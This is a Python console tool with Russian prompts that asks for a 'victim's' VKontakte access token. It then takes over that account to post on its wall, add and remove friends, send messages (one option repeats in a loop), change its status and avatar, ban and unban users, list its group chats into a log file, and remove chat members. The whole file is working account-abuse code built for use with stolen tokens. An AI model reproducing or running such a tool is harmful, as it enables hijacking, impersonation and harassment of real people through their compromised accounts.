#subprocess.call("notepad.exe")
from prettytable import PrettyTable  
from progress.bar import IncrementalBar                                     
import time
import random
try:
    import urllib
    from urllib import request
except:
    os.system('pip3 install urllib')
import requests
import vk_api
import vk
import pytz
import logging
from local_func import  err_catch, get_time, console_log, clear, print_red, print_yellow, print_blue
from tokens import add_rows

def post():       #Создает запись на стене вконтакте, убедитесь что токен поддерживает все функции!
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    vk = vk_api.VkApi(token=token)
    clear()
    info = input("[" + get_time() + "] " + 'Введите новый текст поста >>> ')
    try:
        vk.method("wall.post", {"message": info})
    except:
        err_catch()
        menu()
    console_log("[" + get_time() + "] " + 'Пост добавлен успешно!')
    menu()
def friend_add():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    vk = vk_api.VkApi(token=token)
    clear()
    info = input("[" + get_time() + "] " + 'Введите айди юзера >>> ')
    try:
        vk.method("friends.add", {"user_id": info})
    except:
        err_catch()
        menu()
    console_log("[" + get_time() + "] " + 'Заявка отправлена успешно')
    menu()
def friend_remove():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    vk = vk_api.VkApi(token=token)
    clear()
    info = input("[" + get_time() + "] " + 'Введите айди юзера >>> ')
    try:
        vk.method("friends.delete", {"user_id": info})
    except:
        err_catch()
        menu()
    console_log("[" + get_time() + "] " + 'Друг удален успешно')
    menu()
def msg_send():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    vk = vk_api.VkApi(token=token)
    clear()
    info = input('Введите айди юзера или чата :')
    while True:
        msg = input('Введите сообщение юзеру >>> ')
        try:
            vk.method("messages.send", {"peer_id": info, "message": msg, "random_id": random.randint(1, 2147483647)})
        except:
            err_catch()
            menu()
        console_log('Сообщение отправлено успешно')
        print('Для выхода нажмите ctrl+c')
        time.sleep(0.3)
def vertyeplyshka():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    vk = vk_api.VkApi(token=token)
    clear()
    info = input('Введите айди юзера или чата :')
    attachment = "photo245029801_457250229"
    vk.method("messages.send", {"peer_id": info, "random_id": random.randint(1, 2147483647), "attachment": attachment})
    console_log('Сообщение отправлено успешно')
    menu()   
def status_change():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    vk = vk_api.VkApi(token=token)
    clear()
    console_log('Идет смена статуса...') 
    info = input('Введите новый статус :')
    vk.method("status.set", {"text": info})
    console_log('Статус сменен успешно!')
    menu()
def ava_change():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    vk = vk_api.VkApi(token=token) 
    clear()
    console_log('Идет смена аватарки...') 
    upload = vk_api.VkUpload(vk)
    photo = upload.photo_profile('213.jpg')
    console_log('Аватар сменен успешно!')
    menu()        
def unban():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    session = vk_api.VkApi(token=token)
    vks = session.get_api()
    clear()
    user_id = input('Введите цифровой id пользователя, которого вы хотите убрать из чс $')
    try:
        vks.account.unbanUser(user_id=user_id)
        console_log('specktor.json разбанил {user_id}')
        time.sleep(1)          
    except:
        err_catch()  
        menu()
    menu()       
def ban():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    clear()
    session = vk_api.VkApi(token=token)
    vk = session.get_api()
    user_id = input('Введите цифровой id пользователя, которого вы хотите добавить в чс >>> ')
    try:
        vk.account.banUser(user_id = user_id)
        console_log('specktor.json забанил {user_id}')
        time.sleep(1)              
    except:
        err_catch()
        menu()
    menu()
def list_chat():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    session = vk_api.VkApi(token=token)
    vk = session.get_api()
    clear()
    n = 0
    user = vk.users.get()
    fullname = user[0]['first_name'] +  ' ' + user[0]['last_name']
    try:
        logging.info("----------------------------------------------------------------------------------------------------")
        logging.info(fullname)
        logging.info("----------------------------------------------------------------------------------------------------")
        while True:
            n+=1
            peer_ids = 2000000000 + n
            print(vk.messages.getConversationsById(peer_ids = 2000000000 + n, extended = 0)["items"][0]["chat_settings"]["title"], peer_ids)
            show = vk.messages.getConversationsById(peer_ids = 2000000000 + n, extended = 0)["items"][0]["chat_settings"]["title"], peer_ids
            logging.info(show)
    except:
        print_red("Все веседы пропарсены, выберите айди нужной беседы в логах")
        menu()
    menu()
def remove_member():
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>') 
    session = vk_api.VkApi(token=token)
    vks = session.get_api()
    clear()
    chat_id = input("[" + get_time() + "] " + 'Введите айди беседы >>>')
    user_id = input("[" + get_time() + "] " + 'Введите айди учасника, которого вы хотите кикнуть >>>')
    try:
        vks.messages.removeChatUser(chat_id=chat_id, user_id=user_id)
    except:
        err_catch()
        menu()
    print("Участник удален")
    menu()

bar = IncrementalBar('Подгрузка модулей...', max = 100)
n = 0
for i in range(5):
        n += 1
        for i in range(20):
            bar.next()
            time.sleep(0.01)
        print('    Контрольная точка загрузки №', n, ' пройдена')
        time.sleep(0.3)
        clear()
bar.finish()

def menu():
    clear()
    print_yellow("____________________________________________________________________________________________________________________________")
    print_yellow('''|                ____    _                                                                                                 |''')
    print_yellow('''|   ____  __  __/ / /   (_)________  ____                                                                                  |''')
    print_yellow('''|  / __ \/ / / / / /   / / ___/ __ \/ __ \                              by dream.json aka dream-rm-rf                      |''')
    print_yellow('''| / / / / /_/ / / /   / (__  ) /_/ / / / /                                       совместно с bubl1k.json                   |''')
    print_yellow('''|/_/ /_/\__,_/_/_(_)_/ /____/\____/_/ /_/                                                                                  |''')
    print_yellow("|                 /___/                                      v1.5.1 build 2                                                |")
    print_yellow("|__________________________________________________________________________________________________________________________|")
    print_yellow(" ")
    print_yellow("____________________________________________________________________________________________________________________________")
    print_yellow('|Здесь могла быть ваша реклама                                                                                             |')
    print_yellow("|__________________________________________________________________________________________________________________________|")
    print_yellow('|Для правильного отображения скрипта, разверните окно консоли на весь экран                                                |')
    print_yellow('|Пропарсенные беседы будут сохраняться в файл exsample.log                                                                 |')
    print_yellow("|__________________________________________________________________________________________________________________________|")
    print()
    print()
    print_red('Выберите функцию')
    print_yellow("____________________________________________________________________________________________________________________________")    
    print_blue('1.Добавить пост')
    print_blue('2.Добавить в друзья')
    print_blue('3.Убрать из друзей')
    print_blue('4.Отправить сообщение')
    print_blue('5.Сменить статус')
    print_blue('6.Сменить аватарку')
    print_blue('7.Убрать из чс')
    print_blue('8.Добавить в чс')
    print_blue('9.Отправить вертеплюшку')
    print_blue("10.Пропарсить беседы и вывести их айди ")
    print_red("11.Пропарсить все диалоги, не работает")  #В разработке
    print_blue("12.Удалить участника из беседы, в том числе и себя")
    print_yellow("____________________________________________________________________________________________________________________________")
    add_rows()
    print_yellow("____________________________________________________________________________________________________________________________")
    x  = int(input("Выберите функцию >>>"))
    if x == 1: post()
    elif x == 2: friend_add()
    elif x == 3: friend_remove()
    elif x == 4: msg_send()
    elif x == 5: status_change()
    elif x == 6: ava_change()
    elif x == 7: unban()
    elif x == 8: ban()
    elif x == 9: vertyeplyshka()
    elif x == 10: list_chat()
    elif x == 11: 
        print('В РАЗРАБОТКЕ НЕ ПОНЯТНО ЧТО ЛИ???')
    elif x == 12: remove_member()
    # elif x == 13: chk_tkn()
    else: 
        print("[" + get_time() + "] " + 'Некорректный ввод')
        time.sleep(1)
        menu()   
menu()

